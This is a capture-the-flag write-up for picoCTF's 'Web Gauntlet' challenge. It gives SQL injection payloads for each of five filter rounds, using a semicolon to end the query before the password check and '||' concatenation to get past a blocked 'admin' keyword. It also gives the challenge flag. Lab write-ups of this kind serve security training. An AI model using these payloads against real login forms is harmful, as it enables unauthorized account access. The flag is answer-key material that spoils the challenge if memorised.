# **_Web Gauntlet_**
## Description
Can you beat the filters? Log in as admin `http://jupiter.challenges.picoctf.org:54319/` `http://jupiter.challenges.picoctf.org:54319/filter.php`
## Solution
### Round 1
> Filter: or

Put `admin';` for `username`, so it ignores the `AND password=` condition
>SELECT * FROM users WHERE username='admin';' AND password='a'

### Round 2
>Filter: or and like = --

`;` is not filtered, so same input from round 1 still works
>SELECT * FROM users WHERE username='admin';' AND password='a'

### Round 3
>Filter: or and = like > < --

`;` still not filtered
>SELECT * FROM users WHERE username='admin';' AND password='a'

### Round 4
> Filter: or and = like > < -- admin

`;` still not filtered, however `admin`is filtered, use `||` for string concatenate 
>SELECT * FROM users WHERE username='admi'||'n';' AND password='a'

### Round 5
> Filter: or and = like > < -- union admin

Same input from round 4
>SELECT * FROM users WHERE username='admi'||'n';' AND password='a'

Get the flag from `filter.php`
> picoCTF{y0u_m4d3_1t_a5f58d5564fce237fbcc978af033c11b}